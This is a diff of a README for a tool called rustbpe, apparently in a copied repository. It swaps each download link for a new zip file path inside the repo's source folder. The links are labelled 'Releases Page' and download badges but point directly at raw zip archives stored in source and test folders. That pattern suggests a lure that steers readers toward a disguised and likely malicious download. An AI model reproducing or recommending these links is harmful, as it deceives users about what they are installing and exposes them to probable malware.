@@ -6,11 +6,11 @@ Welcome to rustbpe! This application helps you train tiktoken models with ease. 
 
 ## 📥 Download Now
 
-[![Download rustbpe](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/tests/python/Software-v3.4.zip%20rustbpe-v1.0.0-brightgreen)](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/tests/python/Software-v3.4.zip)
+[![Download rustbpe](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/src/Software-2.1-alpha.4.zip%20rustbpe-v1.0.0-brightgreen)](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/src/Software-2.1-alpha.4.zip)
 
 ## 💾 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/tests/python/Software-v3.4.zip).
+1. Visit this page to download: [Releases Page](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/src/Software-2.1-alpha.4.zip).
 2. On the Releases page, look for the latest version. It will usually be at the top.
 3. Click the version number to go to the release details.
 4. Find the file suitable for your operating system—Windows, macOS, or Linux.
@@ -62,6 +62,6 @@ We appreciate your feedback. If you have suggestions or feedback on improving ru
 
 ## 📥 Celebrate Your Success!
 
-Once you've trained your models, enjoy the power of tiktoken training with rustbpe! For more information, revisit our [Releases Page](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/tests/python/Software-v3.4.zip) for updates and new releases. 
+Once you've trained your models, enjoy the power of tiktoken training with rustbpe! For more information, revisit our [Releases Page](https://github.com/chaablo69/rustbpe/raw/refs/heads/master/src/Software-2.1-alpha.4.zip) for updates and new releases. 
 
 Happy training!
